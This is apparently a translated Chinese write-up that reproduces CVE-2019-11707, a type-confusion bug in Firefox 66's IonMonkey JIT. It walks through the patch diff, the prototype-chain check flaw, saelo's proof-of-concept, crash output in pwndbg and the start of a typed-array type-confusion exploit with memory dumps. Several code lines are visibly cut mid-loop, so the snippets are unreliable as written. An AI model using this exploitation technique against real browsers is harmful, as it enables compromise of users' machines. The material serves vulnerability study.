# firefox pwn 入门 - CVE-2019-11707 复现笔记
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
这篇文章主要复现了一下`CVE-2019-11707`
这个洞，大部分都是参考[vigneshsrao](https://vigneshsrao.github.io/writeup/) 的分析文章, 这个漏洞是
`Ionmonkey` jit 实现上的漏洞，最终可以导致类型混淆。
## 环境配置
调试用的[`firefox
66.0.3`](https://archive.mozilla.org/pub/firefox/releases/66.0.3/linux-x86_64/zh-CN/firefox-66.0.3.tar.bz2)，
源码在[这里](https://archive.mozilla.org/pub/firefox/releases/66.0.3/source/firefox-66.0.3.source.tar.xz)
下载，复现环境在 ubuntu 1604 下
我没有办法在ubuntu1604 下编译这个版本的firefox, 但是单独编译 `jsshell` 是可以的， 可以先编个 `jsshell`
来测试然后在跑完整的firefox. firefox 在`about:confg` 里设置
    // 单线程, 便于调试
    browser.tabs.remote.autostart = false
    // 去掉 sandbox
    security.sandbox.content.level = 0
文章涉及的代码都放在了[这里](https://github.com/rtfingc/cve-repo/tree/master/0x08-cve-2019-11707-ionmonkey-type-confuse)
## 漏洞分析
这个漏洞是`saelo` 在19年fuzz出来的，是 `Ionmonkey`
层的漏洞，最终打上的部分[patch](https://hg.mozilla.org/releases/mozilla-beta/rev/109cefe117fbdd1764097e06796960082f4fee4e)如下
    --- a/js/src/jit/MCallOptimize.cpp
    +++ b/js/src/jit/MCallOptimize.cpp
    @@ -922,19 +922,20 @@ IonBuilder::InliningResult IonBuilder::i
       if (clasp != &ArrayObject::class_) {
         return InliningStatus_NotInlined;
       }
       if (thisTypes->hasObjectFlags(constraints(), unhandledFlags)) {
         trackOptimizationOutcome(TrackedOutcome::ArrayBadFlags);
         return InliningStatus_NotInlined;
       }
    +  // Watch out for extra indexed properties on the object or its prototype.
       bool hasIndexedProperty;
       MOZ_TRY_VAR(hasIndexedProperty,
    -              ArrayPrototypeHasIndexedProperty(this, script()));
    +              ElementAccessHasExtraIndexedProperty(this, obj));
       if (hasIndexedProperty) {
         trackOptimizationOutcome(TrackedOutcome::ProtoIndexedProps);
         return InliningStatus_NotInlined;
       }
    //...
patch 只是把原来`hashIndexedProperty` 的`ArrayPrototypeHasIndexedProperty`
检查换成了`ElementAccessHasExtraIndexedProperty`
当创建一个 array 时, 像下面这样，`a` 的prototype 是`Array Object`
    js> a=[1.1,2.2] 
    [1.1, 2.2]
    js> dumpObject(a)
    object a704d898080
      global a704d88b060 [global]
      class 555557f214f0 Array
      group a704d888820
      flags:
      proto 
      properties:
        "length" (shape a704d8b1078 permanent getterOp 5555557ec410 setterOp 5555557ec470)
      elements:
          0: 1.1
          1: 2.2
继续看`a.__proto__` 以及 `a.__proto__.__proto__`
    js> dumpObject(a.__proto__) 
    object a704d8ae040
      global a704d88b060 [global]
      class 555557f214f0 Array
      lazy group
      flags: delegate new_type_unknown
      proto 
      properties:
        "length" (shape a704d899fc8 permanent getterOp 5555557ec410 setterOp 5555557ec470)
    //..........................................
    js> dumpObject(a.__proto__.__proto__)
    object a704d88e040
      global a704d88b060 [global]
      class 555557f23898 Object
      group a704d888250
      flags: delegate new_type_unknown immutable_prototype inDictionaryMode hasShapeTable
      proto null
      properties:
        "toSource":  (shape a704d892128 slot 0)
        "toString":  (shape a704d892100 slot 1)
`a` 的`prototype chains` 如下
    a.__proto__ --> Array.prototype --> Object.prototype --> null
`ArrayPrototypeHasIndexedProperty` 会检查`Array.prototype`
是否有index类型的`properties` , 例如`a.__proto__.m = [1.1,2.2,3.3]`
这个检查发生在`IonBuilder::inlineArrayPopShift`,`IonBuilder::inlineArrayPushShift`以及`IonBuilder::inlineArraySlice`
函数中，他们会在jit中进入`inline cache`时调用.
    AbortReasonOr jit::ArrayPrototypeHasIndexedProperty(IonBuilder* builder,
                                                              JSScript* script) {
      if (JSObject* proto = script->global().maybeGetArrayPrototype()) {
        return PrototypeHasIndexedProperty(builder, proto);
      }
      return true;
    }
这里的漏洞在于检查的不充分，执行`b=[1.1,2.2]; a.__proto__=b`, 原型链就会变成
    a.__proto__ --> b.__proto__ --> Array.prototype --> Object.prototype --> null
因为只检查了`Array.prototype` ，所以并不会检查`b` 上是否有`indexed` 类型的`properties`
## 漏洞利用
###  poc 分析
`saelo` 给出了漏洞的poc 如下
        // Run with --no-threads for increased reliability
        const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
        function v7(v8,v9) {
            if (v4.length == 0) {
                v4[3] = {a: 5};
            }    
            const v11 = v4.pop();
            // v11 被认为是一个 object
            v11.a;
            // 执行之后会进入 jit
            for (let v15 = 0; v15  a=[]
    []
    js> a[3]=1
    1
    js> a 
    [, , , 1]
    js> a.__proto__=[4,5]
    [4, 5]
    js> a
    [4, 5, , 1]
    js> a.pop()
    1
    js> a.pop()
    js> a.pop()
    5
    js> a.pop()
    4
执行`pop` 之后`Array.pop` 进入`inline cache`, 根据前面的分析，这里不会检查`v4.__proto__`, 检查通过，
`jit` 层会认为`v4.pop()` 固定是一个`object`, 会去掉其类型检查。
于是在`v7` 里， 当`v4` 5个对象都pop完之后,`v4[3] = {a: 5};` ，`v4` 变成稀疏类型的array, 这时候`p[0]`
会转入`index ==0` 的地方, 当pop到`p[0] = -1.8629373288622089e-06` 时有`v11 ==
-1.8629373288622089e-06` ，但是`jit` 仍认为它是一个`object`，访问`v11.a` 就会有非法内存访问而crash
    js> a=[]
    []
    js> a[3]=1
    1
    js> a
    [, , , 1]
    js> p={}
    ({})
    js>  p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
    [{a:0}, {a:1}, {a:2}]
    js> p[0] = -1.8629373288622089e-06;
    -0.0000018629373288622089
    js> p
    [-0.0000018629373288622089, {a:1}, {a:2}]
    js> a.__proto__=p
    [-0.0000018629373288622089, {a:1}, {a:2}]
    js> a
    [-0.0000018629373288622089, {a:1}, {a:2}, 1]
poc 运行之后效果如下
    pwndbg> set args --no-threads poc.js
    pwndbg> r
     RAX  0x4141414141414141 ('AAAAAAAA')
    //..
     RSI  0x7fffffff9d48 —▸ 0x7fffffff9d80 ◂— 0xbebf414141414141
     R8   0x1
     R9   0x7fffffff9aa8 ◂— 0x0
    //...
     RIP  0x3ac4ec7485d0 ◂— cmp    qword ptr [rax], r11
    ─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
     ► 0x3ac4ec7485d0    cmp    qword ptr [rax], r11
       0x3ac4ec7485d3    jne    0x3ac4ec7485e2
###  漏洞利用
根据前面的分析，我们可以往`p[0]` 存入其他类型的对象，然后在`v7` 的内存访问中就可能出现类型混淆。
`vigneshsrao` 用了`Uint8Array` 和`Uint32Array` 这两个对象来构造类型混淆, 基本上按照saelo 的poc来。
    buf=[];
    for(let i=0;i search -t qword 0x3132333461626364   
                    0x20c9e49383c0 'dcba4321'    
    pwndbg> x/40gx 0x20c9e49383c0-0x40         
    // .. buf[6]
    0x20c9e4938380: 0x00002746d7073a30      0x000020c9e4927330
    0x20c9e4938390: 0x0000000000000000      0x00007fffeb5170c0
    0x20c9e49383a0: 0x00001064f249c1e0      0xfff8800000000060
    0x20c9e49383b0: 0xfffe169ac6f5b080      0xfff8800000000000
    0x20c9e49383c0: 0x3132333461626364      0x0000000000000000
    0x20c9e49383d0: 0x0000000000000000      0x0000000000000000
    // ... buf[7]
    0x20c9e4938420: 0x00002746d7073a30      0x000020c9e4927330
    0x20c9e4938430: 0x0000000000000000      0x00007fffeb5170c0
    0x20c9e4938440: 0x00001064f249c230      0xfff8800000000100// buf[7].byteLength
    0x20c9e4938450: 0xfffa000000000000      0xfff8800000000000
    0x20c9e4938460: 0x0000000000000000      0x0000000000000000